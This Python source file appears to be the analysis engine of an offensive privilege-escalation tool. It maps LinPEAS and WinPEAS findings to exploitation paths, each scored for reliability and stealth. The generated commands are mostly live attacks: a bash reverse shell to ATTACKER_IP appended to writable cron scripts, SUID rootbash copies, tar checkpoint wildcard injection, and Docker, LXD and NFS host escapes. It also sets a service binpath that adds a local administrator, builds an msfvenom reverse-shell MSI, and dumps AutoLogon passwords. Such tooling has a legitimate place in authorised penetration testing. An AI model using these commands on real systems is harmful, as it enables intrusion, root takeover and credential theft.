"""Core analysis engine for privilege escalation detection.

Analyzes parsed enumeration data and generates exploitation paths.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from whirlpool.parser.linpeas import LinPEASResults
    from whirlpool.parser.winpeas import WinPEASResults


class Category(Enum):
    """Categories of privilege escalation techniques."""
    SUID = "suid"
    SUDO = "sudo"
    CAPABILITIES = "capabilities"
    CRON = "cron"
    KERNEL = "kernel"
    DOCKER = "docker"
    LXC_LXD = "lxc_lxd"
    NFS = "nfs"
    PATH_HIJACK = "path_hijack"
    SERVICE = "service"
    PERMISSIONS = "permissions"
    CREDENTIALS = "credentials"
    POTATO = "potato"
    REGISTRY = "registry"
    TOKEN = "token"
    SCHEDULED_TASK = "scheduled_task"
    WILDCARD = "wildcard"
    OTHER = "other"


class Confidence(Enum):
    """Confidence level in the exploitation technique."""
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    THEORETICAL = "theoretical"


class Risk(Enum):
    """Risk level of the exploitation technique."""
    LOW = "low"        # Safe, unlikely to cause issues
    MEDIUM = "medium"  # May leave traces or require cleanup
    HIGH = "high"      # Could cause instability or be detected


@dataclass
class ExploitationPath:
    """Represents a single privilege escalation opportunity."""
    category: Category
    technique_name: str
    description: str
    finding: str  # The specific thing found (e.g., binary path, CVE)
    commands: list[str] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)
    confidence: Confidence = Confidence.MEDIUM
    risk: Risk = Risk.MEDIUM
    references: list[str] = field(default_factory=list)
    notes: str = ""

    # Scoring components (0-100)
    reliability_score: int = 50
    safety_score: int = 50
    simplicity_score: int = 50
    stealth_score: int = 50

    # Base score using default weights (use Ranker.get_score for profile-aware scoring)
    @property
    def _base_score(self) -> float:
        """Calculate weighted base score with default weights.

        Note: Use Ranker.get_score() for profile-aware scoring.
        """
        return (
            self.reliability_score * 0.40 +
            self.safety_score * 0.30 +
            self.simplicity_score * 0.20 +
            self.stealth_score * 0.10
        )


class Analyzer:
    """Analyzes enumeration results and generates exploitation paths."""

    def __init__(self, data_dir: Path | None = None):
        """Initialize analyzer with knowledge bases.

        Args:
            data_dir: Path to data directory containing JSON knowledge bases.
                     Defaults to package data directory.
        """
        if data_dir is None:
            # Default to package data directory
            data_dir = Path(__file__).parent.parent / "data"

        self.data_dir = data_dir
        self._gtfobins: dict = {}
        self._kernel_exploits: dict = {}
        self._potato_matrix: dict = {}
        self._lolbas: dict = {}

        self._load_knowledge_bases()

    def _load_knowledge_bases(self) -> None:
        """Load JSON knowledge bases."""
        # Load GTFOBins
        gtfobins_path = self.data_dir / "gtfobins.json"
        if gtfobins_path.exists():
            with open(gtfobins_path, encoding='utf-8') as f:
                data = json.load(f)
                self._gtfobins = data.get("binaries", {})

        # Load kernel exploits
        kernel_path = self.data_dir / "kernel_exploits.json"
        if kernel_path.exists():
            with open(kernel_path, encoding='utf-8') as f:
                self._kernel_exploits = json.load(f)

        # Load potato matrix
        potato_path = self.data_dir / "potato_matrix.json"
        if potato_path.exists():
            with open(potato_path, encoding='utf-8') as f:
                self._potato_matrix = json.load(f)

        # Load LOLBAS
        lolbas_path = self.data_dir / "lolbas.json"
        if lolbas_path.exists():
            with open(lolbas_path, encoding='utf-8') as f:
                data = json.load(f)
                self._lolbas = data.get("binaries", {})

    def analyze_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Linux enumeration results.

        Args:
            results: LinPEASResults or similar parsed data

        Returns:
            List of ExploitationPath objects
        """
        paths: list[ExploitationPath] = []

        # Analyze each category
        paths.extend(self._analyze_suid(results))
        paths.extend(self._analyze_capabilities(results))
        paths.extend(self._analyze_sudo(results))
        paths.extend(self._analyze_cron(results))
        paths.extend(self._analyze_kernel_linux(results))
        paths.extend(self._analyze_docker(results))
        paths.extend(self._analyze_nfs(results))

        return paths

    def analyze_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows enumeration results.

        Args:
            results: WinPEASResults or similar parsed data

        Returns:
            List of ExploitationPath objects
        """
        paths: list[ExploitationPath] = []

        # Analyze each category
        paths.extend(self._analyze_tokens(results))
        paths.extend(self._analyze_services_windows(results))
        paths.extend(self._analyze_scheduled_tasks(results))
        paths.extend(self._analyze_kernel_windows(results))
        paths.extend(self._analyze_registry(results))

        return paths

    def _analyze_suid(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze SUID binaries."""
        paths = []

        for suid in getattr(results, 'suid_binaries', []):
            binary_name = Path(suid.path).name

            # Check GTFOBins
            if binary_name in self._gtfobins:
                gtfo = self._gtfobins[binary_name]

                if "suid" in gtfo:
                    suid_info = gtfo["suid"]
                    commands = suid_info.get("commands", [])

                    # Substitute actual path
                    actual_commands = []
                    for cmd in commands:
                        actual_cmd = cmd.replace(f"./{binary_name}", suid.path)
                        actual_commands.append(actual_cmd)

                    path = ExploitationPath(
                        category=Category.SUID,
                        technique_name=f"SUID {binary_name}",
                        description=suid_info.get("description", f"Exploit SUID bit on {binary_name}"),
                        finding=suid.path,
                        commands=actual_commands,
                        confidence=Confidence.HIGH,
                        risk=Risk.LOW,
                        references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#suid"],
                        reliability_score=90,
                        safety_score=85,
                        simplicity_score=90,
                        stealth_score=70
                    )
                    paths.append(path)
            else:
                # Unknown SUID - flag for manual review
                path = ExploitationPath(
                    category=Category.SUID,
                    technique_name=f"SUID {binary_name} (Unknown)",
                    description="SUID binary not in GTFOBins - may have custom exploitation path",
                    finding=suid.path,
                    commands=[f"# Investigate: {suid.path}", "strings {suid.path}", "ltrace {suid.path}"],
                    confidence=Confidence.LOW,
                    risk=Risk.LOW,
                    notes="Manual analysis required",
                    reliability_score=30,
                    safety_score=90,
                    simplicity_score=40,
                    stealth_score=60
                )
                paths.append(path)

        return paths

    def _analyze_capabilities(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Linux capabilities."""
        paths = []

        # High-value capabilities
        dangerous_caps = {
            "cap_setuid": "Can set UID - direct privilege escalation",
            "cap_setgid": "Can set GID - group escalation",
            "cap_dac_override": "Bypass file read/write permission checks",
            "cap_dac_read_search": "Bypass file read permission checks",
            "cap_sys_admin": "Broad sysadmin capabilities",
            "cap_sys_ptrace": "Can trace/debug processes",
            "cap_net_admin": "Network configuration capabilities",
            "cap_net_raw": "Raw socket capabilities",
            "cap_chown": "Can change file ownership",
            "cap_fowner": "Bypass ownership checks"
        }

        for cap_entry in getattr(results, 'capabilities', []):
            binary_name = Path(cap_entry.path).name

            # Check for dangerous capabilities
            dangerous_found = []
            for cap in cap_entry.capabilities:
                if cap in dangerous_caps:
                    dangerous_found.append((cap, dangerous_caps[cap]))

            if dangerous_found:
                # Check GTFOBins for capability abuse
                commands = []
                if binary_name in self._gtfobins:
                    gtfo = self._gtfobins[binary_name]
                    if "capabilities" in gtfo:
                        cap_info = gtfo["capabilities"]
                        for cmd in cap_info.get("commands", []):
                            actual_cmd = cmd.replace(f"./{binary_name}", cap_entry.path)
                            commands.append(actual_cmd)
                    elif "suid" in gtfo:
                        # Some SUID techniques work with capabilities too
                        for cmd in gtfo["suid"].get("commands", []):
                            actual_cmd = cmd.replace(f"./{binary_name}", cap_entry.path)
                            commands.append(actual_cmd)

                if not commands:
                    commands = [f"# Binary: {cap_entry.path}", f"# Capabilities: {cap_entry.cap_string}"]

                cap_names = ", ".join([c[0] for c in dangerous_found])
                path = ExploitationPath(
                    category=Category.CAPABILITIES,
                    technique_name=f"Capability {cap_names} on {binary_name}",
                    description=f"Binary has dangerous capabilities: {'; '.join([c[1] for c in dangerous_found])}",
                    finding=f"{cap_entry.path} = {cap_entry.cap_string}",
                    commands=commands,
                    confidence=Confidence.HIGH if "cap_setuid" in cap_names else Confidence.MEDIUM,
                    risk=Risk.LOW,
                    references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#capabilities"] if binary_name in self._gtfobins else [],
                    reliability_score=85 if commands else 50,
                    safety_score=85,
                    simplicity_score=80 if commands else 40,
                    stealth_score=75
                )
                paths.append(path)

        return paths

    def _analyze_sudo(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze sudo privileges."""
        paths = []

        for sudo in getattr(results, 'sudo_rights', []):
            for command in sudo.commands:
                command = command.strip()

                # Skip if ALL with no specific binary
                if command == "ALL":
                    path = ExploitationPath(
                        category=Category.SUDO,
                        technique_name="Sudo ALL",
                        description="User can run any command as root",
                        finding=sudo.raw_line,
                        commands=["sudo su", "sudo /bin/bash"],
                        confidence=Confidence.HIGH,
                        risk=Risk.LOW,
                        reliability_score=100,
                        safety_score=100,
                        simplicity_score=100,
                        stealth_score=50
                    )
                    paths.append(path)
                    continue

                # Extract binary from command
                # Handle patterns like /usr/bin/vim, (root) /bin/bash, NOPASSWD: /usr/bin/find
                binary_match = re.search(r'(/\S+)', command)
                if binary_match:
                    binary_path = binary_match.group(1)
                    binary_name = Path(binary_path).name

                    # Check GTFOBins
                    if binary_name in self._gtfobins:
                        gtfo = self._gtfobins[binary_name]

                        if "sudo" in gtfo:
                            sudo_info = gtfo["sudo"]
                            commands = []
                            for cmd in sudo_info.get("commands", []):
                                # Replace generic sudo with actual command
                                actual_cmd = cmd.replace(f"sudo {binary_name}", f"sudo {binary_path}")
                                commands.append(actual_cmd)

                            path = ExploitationPath(
                                category=Category.SUDO,
                                technique_name=f"Sudo {binary_name}",
                                description=sudo_info.get("description", f"Exploit sudo access to {binary_name}"),
                                finding=sudo.raw_line,
                                commands=commands,
                                prerequisites=[] if sudo.nopasswd else ["Know user password"],
                                confidence=Confidence.HIGH,
                                risk=Risk.LOW,
                                references=[f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo"],
                                notes="NOPASSWD" if sudo.nopasswd else "Password required",
                                reliability_score=95,
                                safety_score=90,
                                simplicity_score=95,
                                stealth_score=60
                            )
                            paths.append(path)
                    else:
                        # Check for env_keep or other exploitable patterns
                        path = ExploitationPath(
                            category=Category.SUDO,
                            technique_name=f"Sudo {binary_name} (Unknown)",
                            description=f"Sudo access to {binary_name} - not in GTFOBins",
                            finding=sudo.raw_line,
                            commands=[f"# Investigate: {command}"],
                            confidence=Confidence.LOW,
                            risk=Risk.LOW,
                            notes="Manual analysis required",
                            reliability_score=30,
                            safety_score=90,
                            simplicity_score=30,
                            stealth_score=60
                        )
                        paths.append(path)

        return paths

    def _analyze_cron(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze cron jobs for exploitation opportunities."""
        paths = []

        for cron in getattr(results, 'cron_jobs', []):
            # Check for writable cron scripts
            if cron.writable:
                path = ExploitationPath(
                    category=Category.CRON,
                    technique_name="Writable Cron Script",
                    description="Cron job executes writable script",
                    finding=f"{cron.schedule} {cron.command}",
                    commands=[
                        f"# Script is writable: {cron.command}",
                        f"echo '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> {cron.command}",
                        "# Or: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=90,
                    safety_score=80,
                    simplicity_score=85,
                    stealth_score=50
                )
                paths.append(path)

            # Check for relative path in cron command (PATH hijack)
            if cron.command and not cron.command.startswith('/'):
                # Extract first word (command)
                cmd_parts = cron.command.split()
                if cmd_parts:
                    cmd_name = cmd_parts[0]
                    if not cmd_name.startswith('/') and not cmd_name.startswith('.'):
                        path = ExploitationPath(
                            category=Category.PATH_HIJACK,
                            technique_name="Cron PATH Hijack",
                            description=f"Cron job uses relative path: {cmd_name}",
                            finding=f"{cron.schedule} {cron.command}",
                            commands=[
                                "# Find writable PATH directories",
                                f"# Create malicious {cmd_name} in writable PATH directory",
                                f"echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/{cmd_name}",
                                f"chmod +x /tmp/{cmd_name}",
                                "# Wait for cron to execute"
                            ],
                            prerequisites=["Writable directory in cron's PATH"],
                            confidence=Confidence.MEDIUM,
                            risk=Risk.LOW,
                            reliability_score=70,
                            safety_score=80,
                            simplicity_score=70,
                            stealth_score=40
                        )
                        paths.append(path)

            # Check for wildcard in command
            if '*' in cron.command:
                path = ExploitationPath(
                    category=Category.WILDCARD,
                    technique_name="Cron Wildcard Injection",
                    description="Cron job uses wildcard that may be exploitable",
                    finding=f"{cron.schedule} {cron.command}",
                    commands=[
                        "# Check what command uses the wildcard (tar, rsync, etc.)",
                        "# For tar with *:",
                        "echo '' > '--checkpoint=1'",
                        "echo '' > '--checkpoint-action=exec=sh shell.sh'",
                        "# For rsync with *:",
                        "echo '' > '-e sh shell.sh'"
                    ],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=60,
                    safety_score=70,
                    simplicity_score=50,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_kernel_linux(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze kernel version for known exploits."""
        paths: list[ExploitationPath] = []

        kernel_version = getattr(results, 'kernel_version', '')
        if not kernel_version:
            return paths

        linux_exploits = self._kernel_exploits.get("linux", {})

        for cve, exploit_info in linux_exploits.items():
            # Check version range
            affected = exploit_info.get("affected_versions", {})

            # Skip distro-specific exploits that don't use min/max schema
            if "distro" in affected and "min" not in affected:
                # Distro-specific exploit (e.g., Ubuntu OverlayFS)
                # Cannot reliably match by kernel version alone
                continue

            min_ver = affected.get("min", "0")
            max_ver = affected.get("max", "999")

            if self._version_in_range(kernel_version, min_ver, max_ver):
                commands = exploit_info.get("commands", [])
                sources = exploit_info.get("exploit_sources", [])

                # Determine confidence based on reliability rating
                reliability = exploit_info.get("reliability", "medium")
                confidence = {
                    "high": Confidence.HIGH,
                    "medium": Confidence.MEDIUM,
                    "low": Confidence.LOW
                }.get(reliability, Confidence.MEDIUM)

                risk_level = exploit_info.get("risk", "medium")
                risk = {
                    "high": Risk.HIGH,
                    "medium": Risk.MEDIUM,
                    "low": Risk.LOW
                }.get(risk_level, Risk.MEDIUM)

                path = ExploitationPath(
                    category=Category.KERNEL,
                    technique_name=f"{exploit_info.get('name', cve)} ({cve})",
                    description=exploit_info.get("description", "Kernel exploit"),
                    finding=f"Kernel {kernel_version} (vulnerable range: {min_ver} - {max_ver})",
                    commands=commands,
                    prerequisites=exploit_info.get("requirements", []),
                    confidence=confidence,
                    risk=risk,
                    references=sources,
                    notes=exploit_info.get("notes", ""),
                    reliability_score=90 if reliability == "high" else 60 if reliability == "medium" else 30,
                    safety_score=90 if risk_level == "low" else 60 if risk_level == "medium" else 30,
                    simplicity_score=70,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_docker(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze Docker-related escalation paths."""
        paths: list[ExploitationPath] = []

        docker_info = getattr(results, 'docker', None)
        if not docker_info:
            return paths

        # Docker group membership
        if docker_info.docker_group_member:
            path = ExploitationPath(
                category=Category.DOCKER,
                technique_name="Docker Group Escape",
                description="User is member of docker group - can mount host filesystem",
                finding="docker group membership",
                commands=[
                    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    "# Or create SUID binary:",
                    "docker run -v /:/mnt --rm -it alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'",
                    "/tmp/rootbash -p"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                references=["https://gtfobins.github.io/gtfobins/docker/"],
                reliability_score=95,
                safety_score=90,
                simplicity_score=90,
                stealth_score=40
            )
            paths.append(path)

        # Docker socket accessible
        if docker_info.docker_socket_accessible:
            path = ExploitationPath(
                category=Category.DOCKER,
                technique_name="Docker Socket Escape",
                description="Docker socket is accessible - can create privileged containers",
                finding="/var/run/docker.sock accessible",
                commands=[
                    "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=85,
                stealth_score=30
            )
            paths.append(path)

        # LXC/LXD group
        if getattr(results, 'lxc_lxd', False):
            path = ExploitationPath(
                category=Category.LXC_LXD,
                technique_name="LXD Container Escape",
                description="User is member of lxd group - can create privileged containers",
                finding="lxd group membership",
                commands=[
                    "# Build Alpine image or download",
                    "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine",
                    "lxc init alpine privesc -c security.privileged=true",
                    "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
                    "lxc start privesc",
                    "lxc exec privesc /bin/sh"
                ],
                prerequisites=["LXD initialized"],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=90,
                safety_score=80,
                simplicity_score=70,
                stealth_score=30
            )
            paths.append(path)

        return paths

    def _analyze_nfs(self, results: LinPEASResults) -> list[ExploitationPath]:
        """Analyze NFS exports for no_root_squash."""
        paths = []

        for nfs_path in getattr(results, 'nfs_no_root_squash', []):
            path = ExploitationPath(
                category=Category.NFS,
                technique_name="NFS no_root_squash",
                description="NFS share with no_root_squash allows root file creation",
                finding=nfs_path,
                commands=[
                    "# On attacker (as root):",
                    f"mount -o rw {getattr(results, 'hostname', 'TARGET')}:{nfs_path} /mnt",
                    "cp /bin/bash /mnt/rootbash",
                    "chmod +s /mnt/rootbash",
                    "# On target:",
                    f"{nfs_path}/rootbash -p"
                ],
                prerequisites=["Attacker machine with root access", "NFS client"],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=80,
                stealth_score=50
            )
            paths.append(path)

        return paths

    def _analyze_tokens(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows token privileges."""
        paths = []

        privileges = getattr(results, 'privileges', [])
        os_version = getattr(results, 'os_version', '')

        potato_attacks = self._potato_matrix.get("attacks", {})
        decision_matrix = self._potato_matrix.get("decision_matrix", {})

        # Check for SeImpersonate or SeAssignPrimaryToken
        has_impersonate = any(p.name == "SeImpersonatePrivilege" for p in privileges)
        has_assign_token = any(p.name == "SeAssignPrimaryTokenPrivilege" for p in privileges)

        if has_impersonate or has_assign_token:
            # Determine best potato based on OS version
            recommended = decision_matrix.get("recommended_order", ["PrintSpoofer", "GodPotato"])

            for potato_name in recommended:
                if potato_name in potato_attacks:
                    potato = potato_attacks[potato_name]

                    # Check OS compatibility
                    os_compat = potato.get("os_compatibility", {})
                    compatible = any(os_version in k or k in os_version for k in os_compat if os_compat.get(k, False))

                    if compatible or not os_version:  # If we can't determine OS, suggest anyway
                        path = ExploitationPath(
                            category=Category.POTATO,
                            technique_name=potato_name,
                            description=potato.get("description", "Token impersonation attack"),
                            finding="SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege enabled",
                            commands=potato.get("commands", []),
                            prerequisites=potato.get("requirements", []),
                            confidence=Confidence.HIGH,
                            risk=Risk.LOW,
                            references=potato.get("exploit_sources", []),
                            notes=potato.get("notes", ""),
                            reliability_score=90,
                            safety_score=85,
                            simplicity_score=85,
                            stealth_score=50
                        )
                        paths.append(path)
                        break  # Only add first compatible potato

        return paths

    def _analyze_services_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows services for privilege escalation."""
        paths = []

        for service in getattr(results, 'vulnerable_services', []):
            # Writable service binary
            if service.writable_binary:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Writable Service Binary: {service.name}",
                    description="Service binary path is writable",
                    finding=service.binary_path,
                    commands=[
                        f"# Backup original: copy \"{service.binary_path}\" \"{service.binary_path}.bak\"",
                        "# Replace with malicious binary",
                        f"copy payload.exe \"{service.binary_path}\"",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.MEDIUM,
                    reliability_score=90,
                    safety_score=70,
                    simplicity_score=80,
                    stealth_score=40
                )
                paths.append(path)

            # Unquoted service path
            if service.unquoted_path:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Unquoted Service Path: {service.name}",
                    description="Service path is unquoted and contains spaces",
                    finding=service.binary_path,
                    commands=[
                        "# If path is: C:\\Program Files\\Some Dir\\binary.exe",
                        "# Try placing payload at: C:\\Program.exe",
                        "# Or: C:\\Program Files\\Some.exe",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    prerequisites=["Write access to parent directory"],
                    confidence=Confidence.MEDIUM,
                    risk=Risk.MEDIUM,
                    reliability_score=70,
                    safety_score=70,
                    simplicity_score=60,
                    stealth_score=40
                )
                paths.append(path)

            # Weak service permissions
            if service.weak_permissions:
                path = ExploitationPath(
                    category=Category.SERVICE,
                    technique_name=f"Weak Service Permissions: {service.name}",
                    description="Service configuration can be modified",
                    finding=f"Service: {service.name}",
                    commands=[
                        f"sc config {service.name} binpath= \"cmd.exe /c net localgroup administrators USER /add\"",
                        f"sc stop {service.name}",
                        f"sc start {service.name}"
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.MEDIUM,
                    reliability_score=85,
                    safety_score=65,
                    simplicity_score=85,
                    stealth_score=30
                )
                paths.append(path)

        return paths

    def _analyze_scheduled_tasks(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows scheduled tasks."""
        paths = []

        for task in getattr(results, 'vulnerable_tasks', []):
            if task.writable_binary:
                path = ExploitationPath(
                    category=Category.SCHEDULED_TASK,
                    technique_name=f"Writable Scheduled Task: {task.name}",
                    description="Scheduled task runs a writable binary",
                    finding=task.binary_path,
                    commands=[
                        f"# Replace binary at: {task.binary_path}",
                        "# Wait for scheduled execution or trigger manually:",
                        f"schtasks /run /tn \"{task.name}\""
                    ],
                    confidence=Confidence.HIGH,
                    risk=Risk.LOW,
                    reliability_score=85,
                    safety_score=80,
                    simplicity_score=85,
                    stealth_score=50
                )
                paths.append(path)

        return paths

    def _analyze_kernel_windows(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows version for kernel exploits."""
        paths: list[ExploitationPath] = []

        os_version = getattr(results, 'os_version', '')
        build_number = getattr(results, 'build_number', '')

        if not os_version:
            return paths

        windows_exploits = self._kernel_exploits.get("windows", {})

        for cve, exploit_info in windows_exploits.items():
            affected = exploit_info.get("affected_versions", {})
            affected_windows = affected.get("windows", [])

            # Check if current version is affected
            is_affected = any(
                ver.lower() in os_version.lower() or
                os_version.lower() in ver.lower()
                for ver in affected_windows
            )

            if is_affected:
                reliability = exploit_info.get("reliability", "medium")
                risk_level = exploit_info.get("risk", "medium")

                path = ExploitationPath(
                    category=Category.KERNEL,
                    technique_name=f"{exploit_info.get('name', cve)} ({cve})",
                    description=exploit_info.get("description", "Windows kernel exploit"),
                    finding=f"Windows {os_version} (Build: {build_number})",
                    commands=exploit_info.get("commands", []),
                    prerequisites=exploit_info.get("requirements", []),
                    confidence=Confidence.HIGH if reliability == "high" else Confidence.MEDIUM,
                    risk=Risk.LOW if risk_level == "low" else Risk.MEDIUM if risk_level == "medium" else Risk.HIGH,
                    references=exploit_info.get("exploit_sources", []),
                    notes=exploit_info.get("notes", ""),
                    reliability_score=90 if reliability == "high" else 60,
                    safety_score=85 if risk_level == "low" else 60,
                    simplicity_score=70,
                    stealth_score=40
                )
                paths.append(path)

        return paths

    def _analyze_registry(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Windows registry for escalation vectors."""
        paths = []

        # AlwaysInstallElevated
        if getattr(results, 'always_install_elevated', False):
            path = ExploitationPath(
                category=Category.REGISTRY,
                technique_name="AlwaysInstallElevated",
                description="MSI packages install with elevated privileges",
                finding="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1",
                commands=[
                    "# Generate malicious MSI:",
                    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi",
                    "# Install MSI:",
                    "msiexec /quiet /qn /i evil.msi"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=95,
                safety_score=85,
                simplicity_score=90,
                stealth_score=50
            )
            paths.append(path)

        # AutoLogon credentials
        if getattr(results, 'autologon_creds', None):
            creds: dict = results.autologon_creds  # type: ignore[assignment]
            path = ExploitationPath(
                category=Category.CREDENTIALS,
                technique_name="AutoLogon Credentials",
                description="Credentials stored in registry for automatic logon",
                finding=f"User: {creds.get('user', 'Unknown')}",
                commands=[
                    f"# Username: {creds.get('user', '')}",
                    f"# Password: {creds.get('password', '')}",
                    "# Try: runas /user:DOMAIN\\USER cmd.exe"
                ],
                confidence=Confidence.HIGH,
                risk=Risk.LOW,
                reliability_score=100,
                safety_score=100,
                simplicity_score=100,
                stealth_score=90
            )
            paths.append(path)

        return paths

    def _version_in_range(self, version: str, min_ver: str, max_ver: str) -> bool:
        """Check if version is within the specified range.

        Args:
            version: Version to check (e.g., "5.10.0")
            min_ver: Minimum version (inclusive)
            max_ver: Maximum version (inclusive)

        Returns:
            True if version is in range
        """
        # Handle "all" sentinel (e.g., PwnKit affects all versions)
        if min_ver == "all" and max_ver == "all":
            return True

        def parse_version(v: str) -> tuple[int, ...]:
            """Parse version string to tuple of integers."""
            parts = re.findall(r'\d+', v)
            if not parts:
                raise ValueError(f"No numeric parts in version: {v}")
            return tuple(int(p) for p in parts[:4])  # Limit to 4 parts

        try:
            ver = parse_version(version)
            min_v = parse_version(min_ver)
            max_v = parse_version(max_ver)

            return min_v <= ver <= max_v
        except (ValueError, IndexError):
            return False
